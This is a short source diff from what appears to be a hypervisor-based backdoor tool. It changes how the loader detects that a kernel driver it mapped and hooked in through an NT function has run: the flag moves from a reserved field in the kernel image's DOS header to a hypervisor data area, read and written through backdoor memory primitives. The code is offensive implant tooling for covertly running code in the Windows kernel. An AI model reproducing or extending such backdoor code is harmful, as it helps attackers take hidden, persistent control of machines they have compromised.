@@ -444,6 +444,7 @@ _nt_found:
         uint8_t nt_func_buff[DRIVER_HOOK_SIZE_MAX];
         uint8_t nt_func_jump[DRIVER_HOOK_SIZE_MAX];
         uint32_t nt_func_saved_size = 0;
+        uint64_t count_addr = 0;
 
         printf("[+] Kernel driver virtual address is 0x%llx (size: 0x%x)\n", driver_base_virt, driver_size);
         
@@ -613,16 +614,16 @@ _nt_found:
 
         printf("[+] Kernel driver mapped to the 0x%llx\n", driver_base_virt);
 
-        IMAGE_DOS_HEADER hdr;
-
-        if (backdoor_phys_read(nt_base_phys, (void *)&hdr, sizeof(IMAGE_DOS_HEADER)) != 0)
+        /*
+            We're using HVBD_DATA structure field as temporary hypervisor memory area
+            to store kernel kernel driver load flag (see backdoor_driver.cpp)
+        */
+        if (backdoor_ept_info_addr(&count_addr) != 0)
         {
             goto _end;
         }
 
-        hdr.e_res[0] = 0x0000;
-
-        if (backdoor_phys_write(nt_base_phys, (void *)&hdr, sizeof(IMAGE_DOS_HEADER)) != 0)
+        if (backdoor_virt_write_32(count_addr, 0) != 0)
         {
             goto _end;
         }
@@ -656,14 +657,16 @@ _nt_found:
 
         while (true)
         {
-            // read kernel image header
-            if (backdoor_phys_read(nt_base_phys, (void *)&hdr, sizeof(IMAGE_DOS_HEADER)) != 0)
+            uint32_t val = 0;
+
+            // read kernel driver load flag
+            if (backdoor_virt_read_32(count_addr, &val) != 0)
             {
                 goto _end;
             }
 
             // check if kernel driver was executed
-            if (hdr.e_res[0] == 0xffff)
+            if (val > 0)
             {
                 printf("[+] Kernel driver was executed!\n");
                 break;
@@ -700,13 +703,6 @@ _nt_found:
             {
                 goto _end;   
             }
-        }
-
-        hdr.e_res[0] = 0x0000;
-
-        if (backdoor_phys_write(nt_base_phys, (void *)&hdr, sizeof(IMAGE_DOS_HEADER)) != 0)
-        {
-            goto _end;
         }
         
         printf("[+] DONE\n");
